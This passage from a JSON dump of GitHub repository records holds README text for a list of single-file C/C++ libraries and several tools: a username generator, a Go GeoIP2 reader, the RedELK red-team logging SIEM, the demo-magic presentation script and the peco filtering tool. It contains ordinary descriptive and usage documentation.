-----------\\n| [cmp](https://github.com/camgunz/cmp) | MIT |C/C++| 2 | MessagePack parser and serializer\\n| [inih](https://github.com/benhoyt/inih) | BSD |C/C++| 2 | .ini file parser\\n|**[ini.h](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| .ini file parser\\n| [minilibs](https://github.com/ccxvii/minilibs) | **public domain** | C | 2 | two-file regex (also binary tree, etc)\\n| [mm_lexer.h](https://github.com/vurtun/mmx) | zlib |C/C++|**1**| C-esque language lexer\\n| [SLRE](https://github.com/cesanta/slre) |_GPLv2_ |C/C++|**1**| regular expression matcher\\n| [tinymemfile](https://github.com/RandyGaul/tinyheaders) | zlib | C++ |**1**| fscanf on in-memory files\\n\\n# profiling\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [MicroProfile](https://github.com/jonasmr/microprofile) | **public domain** | C++ | 2-4 | CPU (and GPU?) profiler, 1-3 header files, uses miniz internally\\n| [prof](https://github.com/cyrus-and/prof) | MIT |C/C++|**1**| profiler for Linux\\n| [Remotery](https://github.com/Celtoys/Remotery) | Apache 2.0 |C/C++| 2 | CPU/GPU profiler Win/Mac/Linux, using web browser for viewer\\n\\n# scripting\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [Duktape](http://duktape.org/) | MIT | C | 2 | embeddable JavaScript engine\\n| [MY-BASIC](https://github.com/paladin-t/my_basic/) | MIT | C | 2 | interpreter for a BASIC dialect scripting language\\n| [LIL](http://runtimeterror.com/tech/lil/) | zlib |C/C++| 2 | interpreter for a Tcl-like scripting language\\n| [lualite](https://github.com/user1095108/lualite) | MIT | C++ |**1**| generate Lua bindings in C++\\n| [Picol](https://chiselapp.com/user/dbohdan/repository/picol/) | BSD |C/C++|**1**| interpreter for a Tcl-like scripting language\\n| [s7](https://ccrma.stanford.edu/software/snd/snd/s7.html) | BSD |C/C++| 2 | interpreter for a subset of Scheme (R5RS/R7RS)\\n\\n# strings\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [dfa](http://bjoern.hoehrmann.de/utf-8/decoder/dfa/) | MIT |C/C++| 2 | fast UTF-8 decoder (need a header file)\\n|**[DG_misc.h](https://github.com/DanielGibson/Snippets/)** | **public domain** |C/C++|**1**| Daniel Gibson's stb.h-esque cross-platform helpers: path/file, strings\\n|**[gb_string.h](https://github.com/gingerBill/gb)** | **public domain** |C/C++|**1**| dynamic strings\\n| [Obfuscate](https://github.com/adamyaxley/Obfuscate) | **public domain** | C++ |**1**| Guaranteed compile-time string literal obfuscation library for C++14\\n| [inja.hpp](https://github.com/pantor/inja) | MIT | C++ |**1**| template engine\\n|**[strpool.h](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| string interning\\n| [str_view.hpp](https://github.com/sawickiap/str_view) | MIT | C++ |**1**| null-termination-aware string-view class\\n|**[utf8](https://github.com/sheredom/utf8.h)** | **public domain** |C/C++|**1**| UTF-8 string library\\n\\n# unit testing\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [catch](https://github.com/philsquared/Catch) | Boost | C++ |**1**| unit testing\\n| [catch2](https://github.com/catchorg/Catch2/) | Boost | C++ |**1**| unit testing\\n| [doctest](https://github.com/onqtam/doctest) | MIT | C++ |**1**| unit testing\\n| [fctx](https://github.com/imb/fctx) | BSD |C/C++|**1**| unit testing\\n| [greatest](https://github.com/silentbicycle/greatest) | iSC | C |**1**| unit testing\\n| [hippomocks](https://github.com/dascandy/hippomocks) | LGPL | C++ |**1**| unit testing\\n|**[labrat](https://github.com/squarewave/labrat)** | **public domain** |C/C++|**1**| unit testing\\n| [minctest](https://github.com/codeplea/minctest) | zlib | C |**1**| unit testing\\n| [munit](https://github.com/nemequ/munit) | MIT | C |**1**| unit testing\\n| [SPUT](http://www.lingua-systems.com/unit-testing/) | BSD |C/C++|**1**| unit testing\\n| [trompeloeil](https://github.com/rollbear/trompeloeil) | Boost | C++ |**1**| unit testing\\n| [utest](https://github.com/evolutional/utest) | MIT |C/C++|**1**| unit testing\\n|**[utest.h](https://github.com/sheredom/utest.h)** | **public domain** |C/C++|**1**| unit testing\\n\\n# user interface\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [dear imgui](https://github.com/ocornut/imgui) | MIT | C++ | 9 | an immediate-mode GUI formerly named \\\"ImGui\\\"; [3rd-party C wrapper](https://github.com/Extrawurst/cimgui)\\n| [libcmdf](https://github.com/ronen25/libcmdf) | **public domain** | C |**1**| a small library for writing CLI applications\\n| [linenoise](https://github.com/antirez/linenoise) | BSD |C/C++| 2 | terminal readline w/ history etc\\n| [noc_file_dialog.h](https://github.com/guillaumechereau/noc) | MIT |C/C++| 1 | file open/save dialogs (Win/Mac/Linux)\\n| [nuklear](https://github.com/vurtun/nuklear) | **public domain** |C/C++|**1**| minimal GUI toolkit\\n| [tinyfiledialogs](https://sourceforge.net/projects/tinyfiledialogs/) | ZLIB |C/C++| 2 | modal dialogs inc. file open/save (Win/Mac/Linux)\\n| [wcwidth9](https://github.com/joshuarubin/wcwidth9) | Apache 2.0 | C | 1 | platform independent wcwidth with full unicode 9 support\\n\\n# vectors\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [algebra3.h](http://www.animats.com/source/graphics/algebra3.h) | **public domain** | C++ |**1**| vector utilities for 2, 3, and 4 element vectors, all inline\\n|**[ccVector.h](https://github.com/jobtalle/ccVector)** | **public domain** |C/C++|**1**| Vector, quaternion and matrix math\\n|**[gb_math](https://github.com/gingerBill/gb/blob/master/gb_math.h)** | **public domain** |C/C++|**1**| Vector, quaternion and matrix math w/o math.h\\n|**[Handmade Math](https://github.com/StrangeZak/Handmade-Math)** | **public domain** |C/C++|**1**| vector math\\n| [linalg.h](https://github.com/sgorsten/linalg) | **public domain** | C++ |**1**| vector/matrix/quaternion math\\n| [linalg](https://github.com/ilyak/linalg) | ISC |C/C++|**1**| vector/matrix/quaternion math\\n| [mm_vec.h](https://github.com/vurtun/mmx) | BSD |C/C++|**1**| SIMD vector math\\n\\n# video\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [jo_mpeg](http://www.jonolick.com/home/mpeg-video-writer) | **public domain** | C++ |**1**| MPEG file writer\\n\\n# videogames\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n|**[app.h](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| Windows-only-but-meant-to-be-cross-platform game-ish framework\\n\\n# miscellaneous\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [ASAP](https://github.com/mobius3/asap) | MIT | C++ |**1**| library for parsing, printing, iterating and operating on dates.\\n| [cpp-generators](https://github.com/c-smile/cpp-generators) | BSD | C++ |**1**| generators in C++\\n| [Hedley](https://nemequ.github.io/hedley/) | **public domain** |C/C++|**1**| compiler portability, optimization, static analysis, etc.\\n| [levenshtein](https://github.com/wooorm/levenshtein.c) | MIT |C/C++| 2 | compute edit distance between two strings\\n| [MakeID.h](http://www.humus.name/3D/MakeID.h) | **public domain** | C++ |**1**| allocate/deallocate small integer IDs efficiently\\n| [picobench](https://github.com/iboB/picobench) | MIT | C++ |**1**| microbenchmarking\\n| [PlusCallback](https://github.com/codeplea/pluscallback) | zlib | C++ |**1**| function/method callbacks\\n|**[process.h](https://github.com/sheredom/process.h)** | **public domain** |C/C++|**1**| process control API\\n| [random](https://github.com/effolkronium/random) | MIT | C++ |**1**| convenient API for random\\n| [sokol_time.h](https://github.com/floooh/sokol) | MIT |C/C++|**1**| cross-platform time measurement\\n| [stmr](https://github.com/wooorm/stmr.c) | MIT | C | 2 | extract English word stems\\n| [tinyformat](https://github.com/c42f/tinyformat) | Boost | C++ |**1**| typesafe printf\\n| [tinytime](https://github.com/RandyGaul/tinyheaders) | zlib |C/C++|**1**| quick-and-dirty time elapsed time\\n| [visit_struct](https://github.com/cbeck88/visit_struct) | Boost | C++ | 2 | struct-field reflection\\n\\n\\nThere are also these XML libraries, but I am so significantly not a fan of XML that I've consigned these to the basement to make you think twice.\\n\\n- parsing: [tinyxml2](https://github.com/leethomason/tinyxml2): XML (zlib license)\\n- parsing: [pugixml](http://pugixml.org/): XML (MIT license)\\n- parsing: [yxml](https://dev.yorhel.nl/yxml): XML (MIT license)\\n\\n## New libraries and corrections\\n\\nSubmissions of new libraries: I accept submissions (as issues or as pull requests). Please\\nnote that every file that must be included in a user's project counts; a header and a source\\nfile is 2 files, but a header file, source file, and LICENSE (if the license isn't in the\\nsource file) is 3 files, and won't be accepted, because it's not 2 files. But actually\\n'LICENSE' is a problem for just dropping the library in a source tree anyway, since it's\\nnot scoped to just the library, so library authors are encouraged to include the license in the\\nsource file and not require a separate LICENSE.\\n\\nCorrections: if information for a library above is wrong, please send a correction as an\\nissue, pull request, or email. Note that if the list indicates a library works from both\\nC/C++, but it doesn't, this could be an error in the list or it could be a bug in the\\nlibrary. If you find a library doesn't work in 32-bit or 64-bit, the library should be\\nremoved from this list, unless it's a bug in the library.\\n\\n## *List FAQ*\\n\\n### Can I link directly to this list?\\n\\nYes. [This is the preferred link.](https://github.com/nothings/single_file_libs)\\n\\n### Why isn't library XXX which is made of 3 or more files on this list?\\n\\nI draw the line arbitrarily at 2 files at most. (Note that some libraries that appear to\\nbe two files require a separate LICENSE file, which made me leave them out). Some of these\\nlibraries are still easy to drop into your project and build, so you might still be ok with them.\\nBut since people come to stb for single-file public domain libraries, I feel that starts\\nto get too far from what we do here.\\n\\n### Why isn't library XXX which is at most two files and has minimal other dependencies on this list?\\n\\nProbably because I don't know about it, feel free to submit a pull request, issue, email, or tweet it at\\nme (it can be your own library or somebody else's). But I might not include it for various\\nother reasons, including subtleties of what is 'minimal other dependencies' and subtleties\\nabout what is 'lightweight'.\\n\\n### Why isn't SQLite's amalgamated build on this list?\\n\\nCome on.\\n\"", "topics": ["c", "list"], "writeup": "A list containing small, easy-to-integrate, portable libraries which are usable from C and/or C++, These libraries should be able to be compiled on both 32-bit and 64-bit platforms and contain <= 3 files to include.\n", "ignoredescription": true, "id": 68, "full_name": "nothings/single_file_libs", "url": "https://github.com/nothings/single_file_libs", "topic_string": "c list"},
{"tags": [], "owner": "nougator", "description": "A online tool to generate usernames.", "name": "usrnamegen", "topics_string": "", "language": "JavaScript", "readme": "\"# usrnamegen\\nA online tool to generate usernames.\\n\\nTry it [here](https://nougator.github.io/usrnamegen)\\n\"", "topics": ["html", "tool", "random", "css", "username", "web", "generator"], "writeup": "", "ignoredescription": false, "id": 69, "full_name": "nougator/usrnamegen", "url": "https://github.com/nougator/usrnamegen", "topic_string": "html tool random css username web generator"},
{"tags": [], "owner": "oschwald", "description": "Unofficial MaxMind GeoIP2 Reader for Go", "name": "geoip2-golang", "topics_string": "", "language": "Go", "readme": "\"# GeoIP2 Reader for Go #\\n\\n[![GoDoc](https://godoc.org/github.com/oschwald/geoip2-golang?status.svg)](https://godoc.org/github.com/oschwald/geoip2-golang)\\n\\nThis library reads MaxMind [GeoLite2](http://dev.maxmind.com/geoip/geoip2/geolite2/)\\nand [GeoIP2](http://www.maxmind.com/en/geolocation_landing) databases.\\n\\nThis library is built using\\n[the Go maxminddb reader](https://github.com/oschwald/maxminddb-golang).\\nAll data for the database record is decoded using this library. If you only\\nneed several fields, you may get superior performance by using maxminddb's\\n`Lookup` directly with a result struct that only contains the required fields.\\n(See [example_test.go](https://github.com/oschwald/maxminddb-golang/blob/master/example_test.go)\\nin the maxminddb repository for an example of this.)\\n\\n## Installation ##\\n\\n```\\ngo get github.com/oschwald/geoip2-golang\\n```\\n\\n## Usage ##\\n\\n[See GoDoc](http://godoc.org/github.com/oschwald/geoip2-golang) for\\ndocumentation and examples.\\n\\n## Example ##\\n\\n```go\\npackage main\\n\\nimport (\\n\\t\\\"fmt\\\"\\n\\t\\\"github.com/oschwald/geoip2-golang\\\"\\n\\t\\\"log\\\"\\n\\t\\\"net\\\"\\n)\\n\\nfunc main() {\\n\\tdb, err := geoip2.Open(\\\"GeoIP2-City.mmdb\\\")\\n\\tif err != nil {\\n\\t\\tlog.Fatal(err)\\n\\t}\\n\\tdefer db.Close()\\n\\t// If you are using strings that may be invalid, check that ip is not nil\\n\\tip := net.ParseIP(\\\"81.2.69.142\\\")\\n\\trecord, err := db.City(ip)\\n\\tif err != nil {\\n\\t\\tlog.Fatal(err)\\n\\t}\\n\\tfmt.Printf(\\\"Portuguese (BR) city name: %v\\\\n\\\", record.City.Names[\\\"pt-BR\\\"])\\n\\tif len(record.Subdivisions) > 0 {\\n\\t\\tfmt.Printf(\\\"English subdivision name: %v\\\\n\\\", record.Subdivisions[0].Names[\\\"en\\\"])\\n\\t}\\n\\tfmt.Printf(\\\"Russian country name: %v\\\\n\\\", record.Country.Names[\\\"ru\\\"])\\n\\tfmt.Printf(\\\"ISO country code: %v\\\\n\\\", record.Country.IsoCode)\\n\\tfmt.Printf(\\\"Time zone: %v\\\\n\\\", record.Location.TimeZone)\\n\\tfmt.Printf(\\\"Coordinates: %v, %v\\\\n\\\", record.Location.Latitude, record.Location.Longitude)\\n\\t// Output:\\n\\t// Portuguese (BR) city name: Londres\\n\\t// English subdivision name: England\\n\\t// Russian country name: \\u0412\\u0435\\u043b\\u0438\\u043a\\u043e\\u0431\\u0440\\u0438\\u0442\\u0430\\u043d\\u0438\\u044f\\n\\t// ISO country code: GB\\n\\t// Time zone: Europe/London\\n\\t// Coordinates: 51.5142, -0.0931\\n}\\n```\\n\\n## Testing ##\\n\\nMake sure you checked out test data submodule:\\n\\n```\\ngit submodule init\\ngit submodule update\\n```\\n\\nExecute test suite:\\n\\n```\\ngo test\\n```\\n\\n## Contributing ##\\n\\nContributions welcome! Please fork the repository and open a pull request\\nwith your changes.\\n\\n## License ##\\n\\nThis is free software, licensed under the ISC license.\\n\"", "topics": ["geoip2", "database", "maxmind", "geoip", "geolocation"], "writeup": "", "ignoredescription": false, "id": 70, "full_name": "oschwald/geoip2-golang", "url": "https://github.com/oschwald/geoip2-golang", "topic_string": "geoip2 database maxmind geoip geolocation"},
{"tags": [], "owner": "outflanknl", "description": "Red Team's SIEM - tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations.", "name": "RedELK", "topics_string": "", "language": "CSS", "readme": "\"Red Team's SIEM - tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability for the Red Team in long term operations.\\n\\nAs presented and demonstrated at the following conferences:\\n- BruCon 2018 [video](https://www.youtube.com/watch?v=OjtftdPts4g) and [slides](https://github.com/outflanknl/Presentations/blob/master/MirrorOnTheWall_BruCon2018_UsingBlueTeamTechniquesinRedTeamOps_Bergman-Smeets_FINAL.pdf)\\n- x33fcon 2019 [video](https://www.youtube.com/watch?v=-CNMgh0yJag) and [slides](https://github.com/outflanknl/Presentations/blob/master/x33fcon2019_OutOfTheBlue-CatchingBlueTeamOPSECFailures_publicversion.pdf)\\n- Hack in Paris 2019 [video](https://www.youtube.com/watch?v=ZezBCAUax6c) and [slides](https://github.com/outflanknl/Presentations/blob/master/HackInParis2019_WhoWatchesTheWatchmen_Bergman-Smeetsfinal.pdf)\\n\\n\\n# Goal of the project #\\nShort: a Red Team's SIEM.\\n\\nLonger: a Red Team's SIEM that serves two goals:\\n1. **Enhanced usability and overview** for the red team operators by creating a central location where all relevant _operational_ logs from multiple teamservers are collected and enriched. This is great for historic searching within the operation as well as giving a read-only view on the operation (e.g. for the White Team). Especially useful for multi-scenario, multi-teamserver, multi-member and multi-month operations. Also, super easy ways for viewing all screenshots, IOCs, keystrokes output, etc. \\\\o/\\n2. **Spot the Blue Team** by having a central location where all _traffic_ logs from redirectors are collected and enriched. Using specific queries its now possible to detect that the Blue Team is investigating your infrastructure. \\n\\nHere's a conceptual overview of how RedELK works.\\n\\n![](./images/redelk_overview.jpg)\\n\\n\\n\\n# Authors and contribution #\\nThis project is developed and maintained by:\\n- Marc Smeets (@MarcOverIP on Github and Twitter)\\n- Mark Bergman (@xychix on Github and Twitter)\\n\\nWe welcome contributions! Contributions can be both in code, as well as in ideas you might have for further development, alarms, usability improvements, etc. \\n\\n\\n\\n# Current state and features on todo-list #\\nThis project is still in beta phase. This means that it works on our machines and our environment, but no extended testing is performed on different setups. This also means that naming and structure of the code is still subject to change.\\n\\nWe are working (and you are invited to contribute) on many things, amongst others:\\n- **Support for other redirector applications**. E.g. Nginx. Fully tested and working filebeat and logstash configuration.\\n- **Support for other C2 frameworks**. E.g. FactionC2, Covenant, Empire. Fully tested and working filebeat and logstash configurations please.\\n- **Ingest manual IOC data**. When you are uploading a document, or something else, outside of Cobalt Strike, it will not be included in the IOC list. We want an easy way to have these manual IOCs also included. One way would be to enter the data manually in the activity log of Cobalt Strike and have a logstash filter to scrape the info from there.\\n- **Ingest e-mails**. Create input and filter rules for IMAP mailboxes. This way, we can use the same easy ELK interface for having an overview of sent emails, and replies.\\n- **DNS traffic analyses**. Ingest, filter and query for suspicious activities on the DNS level. This will take considerable work due to the large amount of noise/bogus DNS queries performed by scanners and online DNS inventory services. \\n- **Other alarm channels**. Think Slack, Telegram, whatever other way you want for receiving alarms.\\n- **Fine grained authorisation**. Possibility for blocking certain views, searches, and dashboards, or masking certain details in some views. Useful for situations where you don't want to give out all information to all visitors. \\n\"", "topics": ["siem", "redteam", "monitoring", "elastic", "infrastructure", "kibana", "logstash", "security"], "writeup": "", "ignoredescription": false, "id": 71, "full_name": "outflanknl/RedELK", "url": "https://github.com/outflanknl/RedELK", "topic_string": "siem redteam monitoring elastic infrastructure kibana logstash security"},
{"tags": [], "owner": "paxtonhare", "description": "A handy shell script that enables you to write repeatable demos in a bash environment.", "name": "demo-magic", "topics_string": "", "language": "Shell", "readme": "\"# Demo Magic\\n\\ndemo-magic.sh is a handy shell script that enables you to script repeatable demos in a bash environment so you don't have to type as you present. Rather than trying to type commands when presenting you simply script them and let demo-magic.sh run them for you.\\n\\n## Features\\n- Simulates typing. It looks like you are actually typing out commands\\n- Allows you to actually run commands or pretend to do so.\\n- Can hide commands from presentation. Useful for behind the scenes stuff that doesn't need to be shown.\\n\\n## Functions\\n\\n### pe\\nPrint and Execute.\\n\\n1. Waits for you to press <kbd>ENTER</kbd> (unless -n is passed).\\n1. Then simulates typing the command you gave it.\\n1. Then pauses until you press <kbd>ENTER</kbd>.\\n1. Then runs the command.\\n\\n```bash\\n#!/bin/bash\\n\\npe \\\"ls -l\\\"\\n```\\n\\n### pei\\nPrint and Execute immediately.\\n\\n1. Simulates typing the command you gave it.\\n1. Then pauses until you press <kbd>ENTER</kbd>.\\n1. Then runs the command.\\n\\n```bash\\n#!/bin/bash\\n\\npei \\\"ls -l\\\"\\n```\\n\\n### p\\nPrint only.\\n\\n1. Waits for you to press <kbd>ENTER</kbd> (unless -n is passed).\\n1. Then simulates typing the command you gave it.\\n1. Then pauses until you press <kbd>ENTER</kbd>.\\n\\n```bash\\n#!/bin/bash\\n\\np \\\"ls -l\\\"\\n```\\n\\n### wait\\nWaits for the user to press <kbd>ENTER</kbd>.\\n\\nIf `PROMPT_TIMEOUT` is defined and > 0 the demo will automatically proceed after the amount of seconds has passed.\\n\\n```bash\\n#!/bin/bash\\n\\n# Will wait until user presses enter\\nPROMPT_TIMEOUT=0\\nwait\\n\\n# Will wait max 5 seconds until user presses\\nPROMPT_TIMEOUT=5\\nwait\\n\\n```\\n\\n### cmd\\nEnters script into interactive mode and allows newly typed commands to be executed within the script\\n```\\n#!/bin/bash\\n\\ncmd\\n```\\n\\n## Getting Started\\nCreate a shell script and include demo-magic.sh\\n\\n```bash\\n#!/bin/bash\\n\\n########################\\n# include the magic\\n########################\\n. demo-magic.sh\\n\\n# hide the evidence\\nclear\\n\\n# Put your stuff here\\n```\\n\\nThen use the handy functions to run through your demo.\\n\\n## Command line usage\\ndemo-magic.sh exposes some options to your script.\\n- `-d` - disable simulated typing. Useful for debugging\\n- `-h` - prints the usage text\\n- `-n` - set no default waiting after `p` and `pe` functions\\n- `-w` - set no wait timeout after `p` and `pe` functions\\n\\n```bash\\n$ ./my-demo.sh -h\\n\\nUsage: ./my-demo.sh [options]\\n\\n Where options is one or more of:\\n -h Prints Help text\\n -d Debug mode. Disables simulated typing\\n -n No wait\\n -w Waits max the given amount of seconds before proceeding with demo (e.g. `-w5`)\\n```\\n\\n## Useful Tricks\\n\\n### Faking network connections\\nNetwork connections during demos are often unreliable. Try and fake whatever commands would rely on a network connection. For example: Instead of trying to install node modules in a node.js application you can fake it. You can install the node_modules at home on your decent network. Then rename the directory and pretend to install it later by symlinking. If you want to be thorough you can capture the output of npm install into a log file then cat it out later to simulate the install.\\n\\n```bash\\n#!/bin/bash\\n\\n########################\\n# include the magic\\n########################\\n. demo-magic.sh\\n\\n# hide the evidence\\nclear\\n\\n# this command is typed and executed\\npe \\\"cd my-app\\\"\\n\\n# this command is merely typed. Not executed\\np \\\"npm install\\\"\\n\\n# this command runs behind the scenes\\nln -s cached_node_modules node_modules\\n\\n# cat out a log file that captures a previous successful node modules install\\ncat node-modules-install.log\\n\\n# now type and run the command to start your app\\npe \\\"node index.js\\\"\\n```\\n\\n### No waiting\\nThe -n _no wait_ option can be useful if you want to print and execute multiple commands.\\n\\n```bash\\n# include demo-magic\\n. demo-magic.sh -n\\n\\n# add multiple commands\\npe 'git status'\\npe 'git log --oneline --decorate -n 20'\\n```\\n\\nHowever this will oblige you to define your waiting points manually e.g.\\n```bash\\n...\\n# define waiting points\\npe 'git status'\\npe 'git log --oneline --decorate -n 20'\\nwait\\npe 'git pull'\\npe 'git log --oneline --decorate -n 20'\\nwait\\n```\\n\"", "topics": ["automated", "cli", "tool", "demo"], "writeup": "", "ignoredescription": false, "id": 72, "full_name": "paxtonhare/demo-magic", "url": "https://github.com/paxtonhare/demo-magic", "topic_string": "automated cli tool demo"},
{"tags": [], "owner": "peco", "description": "Simplistic interactive filtering tool", "name": "peco", "topics_string": "", "language": "Go", "readme": "\"# peco\\n\\nSimplistic interactive filtering tool\\n\\n*NOTE*: If you are viewing this on GitHub, this document refers to the state of `peco` in whatever current branch you are viewing, _not_ necessarily the state of a currently released version. Please make sure to checkout the [Changes](./Changes) file for features and changes.\\n\\nThis README is long and comprehensive. Use the [Table of Contents](#table-of-contents) to navigate to the section that interests you. It has been placed at the bottom of the README file because of its length.\\n\\n> If you use peco, please consider sponsoring the authors of this project from the \\\"Sponsor\\\" button on the project page at https://github.com/peco/peco. Sponsorship plans start at $1 :)\\n\\n# Description\\n\\n`peco` (pronounced *peh-koh*) is based on a python tool, [percol](https://github.com/mooz/percol). `percol` was darn useful, but I wanted a tool that was a single binary, and forget about python. `peco` is written in Go, and therefore you can just grab [the binary releases](https://github.com/peco/peco/releases) and drop it in your $PATH.\\n\\n`peco` can be a great tool to filter stuff like logs, process stats, find files, because unlike grep, you can type as you think and look through the current results.\\n\\nFor basic usage, continue down below. For more cool elaborate usage samples, [please see the wiki](https://github.com/peco/peco/wiki/Sample-Usage), and if you have any other tricks you want to share, please add to it!\\n\\n## Demo\\n\\nDemos speak more than a thousand words! Here's me looking for a process on my mac. As you can see, you can page through your results, and you can keep changing the query:\\n\\n![Executed `ps -ef | peco`, then the query `root` was typed. This shows all lines containing the word root](http://peco.github.io/images/peco-demo-ps.gif)\\n\\nHere's me trying to figure out which file to open:\\n\\n![Executed `find . -name '*.go' | peco` (within camlistore repository), then the query `camget` was typed. This shows all lines including the word `camget`](http://peco.github.io/images/peco-demo-filename.gif)\\n\\nWhen you combine tools like zsh, peco, and [ghq](https://github.com/motemen/ghq), you can make managing/moving around your huge dev area a piece of cake! (this example doesn't use zsh functions so you can see what I'm doing)\\n\\n![Executed `cd $(ghq list --full-path | peco --query peco)` to show all repositories containing the word `peco`, then to change directories into the one selected](http://peco.github.io/images/peco-demo-ghq.gif)\\n\\n\\n# Features\\n\\n## Incremental Search\\n\\nSearch results are filtered as you type. This is great to drill down to the\\nline you are looking for\\n\\nMultiple terms turn the query into an \\\"AND\\\" query:\\n\\n![Executed `ps aux | peco`, then the query `root app` was typed. This shows all lines containing both `root` and `app`](http://peco.github.io/images/peco-demo-multiple-queries.gif)\\n\\nWhen you find that line that you want, press enter, and the resulting line\\nis printed to stdout, which allows you to pipe it to other tools\\n\\n## Select Multiple Lines\\n\\nYou can select multiple lines! (this example uses C-Space)\\n\\n![Executed `ls -l | peco`, then used peco.ToggleSelection to select multiple lines](http://peco.github.io/images/peco-demo-multiple-selection.gif)\\n\\n## Select Range Of Lines\\n\\nNot only can you select multiple lines one by one, you can select a range of lines (Note: The ToggleRangeMode action is not enabled by default. You need to put a custom key binding in your config file)\\n\\n![Executed `ps -ef | peco`, then used peco.ToggleRangeMode to select a range of lines](http://peco.github.io/images/peco-demo-range-mode.gif)\\n\\n## Select Filters\\n\\nDifferent types of filters are available. Default is case-insensitive filter, so lines with any case will match. You can toggle between IgnoreCase, CaseSensitive, SmartCase, Regexp and Fuzzy filters.\\n\\nThe SmartCase filter uses case-*insensitive* matching when all of the queries are lower case, and case-*sensitive* matching otherwise.\\n\\nThe Regexp filter allows you to use any valid regular expression to match lines.\\n\\nThe Fuzzy filter allows you to find matches using partial patterns. For example, when searching for `ALongString`, you can enable the Fuzzy filter and search `ALS` to find it. The Fuzzy filter uses smart case search like the SmartCase filter.\\n\\n![Executed `ps aux | peco`, then typed `google`, which matches the Chrome.app under IgnoreCase filter type. When you change it to Regexp filter, this is no longer the case. But you can type `(?i)google` instead to toggle case-insensitive mode](http://peco.github.io/images/peco-demo-matcher.gif)\\n\\n## Selectable Layout\\n\\nAs of v0.2.5, if you would rather not move your eyes off of the bottom of the screen, you can change the screen layout by either providing the `--layout=bottom-up` command line option, or set the `Layout` variable in your configuration file\\n\\n![Executed `ps -ef | peco --layout=bottom-up` to toggle inverted layout mode](http://peco.github.io/images/peco-demo-layout-bottom-up.gif)\\n\\n## Works on Windows!\\n\\nI have been told that peco even works on windows :) Look ma! I'm not lying!\\n\\n![Showing peco running on Windows cmd.exe](https://gist.githubusercontent.com/taichi/26814518d8b00352693b/raw/b7745987de32dbf068e81a8308c0c5ed38138649/peco.gif)\\n\\n# Installation\\n\\n### Just want the binary?\\n\\nGo to the [releases page](https://github.com/peco/peco/releases), find the version you want, and download the zip file. Unpack the zip file, and put the binary to somewhere you want (on UNIX-y systems, /usr/local/bin or the like). Make sure it has execution bits turned on. Yes, it is a single binary! You can put it anywhere you want :)\\n\\n_THIS IS THE RECOMMENDED WAY_ (except for macOS homebrew users)\\n\\n### macOS (Homebrew, Scarf)\\n\\nIf you're on macOS and want to use homebrew:\\n\\n```\\nbrew install peco\\n```\\n\\nor with Scarf:\\n\\n```\\nscarf install peco\\n```\\n\\n### Debian and Ubuntu based distributions (APT, Scarf)\\n\\nThere is an official Debian package that can be installed via APT:\\n\\n```\\napt install peco\\n```\\n\\nor with Scarf:\\n\\n```\\nscarf install peco\\n```\\n\\n### Void Linux (XBPS)\\n\\n```\\nxbps-install -S peco\\n```\\n\\n### Arch Linux (AUR)\\n\\n```\\nyay -S peco\\n```\\n\\n### Windows (Chocolatey NuGet Users)\\n\\nThere's a third-party [peco package available](https://chocolatey.org/packages/peco) for Chocolatey NuGet.\\n\\n```\\nC:\\\\> choco install peco\\n```\\n\\n### Building peco yourself\\n\\nMake sure to clone the source code under $GOPATH (i.e. $GOPATH/src/github.com/peco/peco). This is required\\nas the main binary refers to an internal package, which requires that the source code be located in\\nthe correct package location.\\n\\nNavigate to the directory above, then run:\\n\\n```\\nmake build\\n```\\n\\nThis will do the following:\\n\\n1. Run `go build` to create `releases/$VERSION_NUMBER/peco`\\n\\nYou can copy the binary to somewhere in your $PATH, and it should just work.\\n\\nThe above installs the correct versions of peco's dependencies. Then build it:\\n\\n```\\ngo build cmd/peco/peco.go\\n```\\n\\nThis compiles a peco binary in the root of the cloned peco repository. Copy this file to an appropriate location.\\n\\n### go get IS NOT RECOMMENDED\\n\\nPlease DO NOT use `go get` to install this tool. It bypasses the developers' intention of controlling the dependency versioning.\\n\\n# Command Line Options\\n\\n### -h, --help\\n\\nDisplay a help message\\n\\n### --version\\n\\nDisplay the version of peco\\n\\n### --query <query>\\n\\nSpecifies the default query to be used upon startup. This is useful for scripts and functions where you can figure out before hand what the most likely query string is.\\n\\n### --print-query\\n\\nWhen exiting, prints out the query typed by the user as the first line of output. The query will be printed even if there are no matches, if the program is terminated normally (i.e. enter key). On the other hand, the query will NOT be printed if the user exits via a cancel (i.e. esc key).\\n\\n### --rcfile <filename>\\n\\nPass peco a configuration file, which currently must be a JSON file. If unspecified it will try a series of files by default. See `Configuration File` for the actual locations searched.\\n\\n### -b, --buffer-size <num>\\n\\nLimits the buffer size to `num`. This is an important feature when you are using peco against a possibly infinite stream, as it limits the number of lines that peco holds at any given time, preventing it from exhausting all the memory. By default the buffer size is unlimited.\\n\\n### --null\\n\\nWARNING: EXPERIMENTAL. This feature will probably stay, but the option name may change in the future.\\n\\nChanges how peco interprets incoming data. When this flag is set, you may insert NUL ('\\\\0') characters in your input. Anything before the NUL character is treated as the string to be displayed by peco and is used for matching against user query. Anything after the NUL character is used as the \\\"result\\\": i.e., when peco is about to exit, it displays this string instead of the original string displayed.\\n\\n[Here's a simple example of how to use this feature](https://gist.github.com/mattn/3c7a14c1677ecb193acd)\\n\\n### --initial-index\\n\\nSpecifies the initial line position upon start up. E.g. If you want to start out with the second line selected, set it to \\\"1\\\" (because the index is 0 based).\\n\\n### --initial-filter 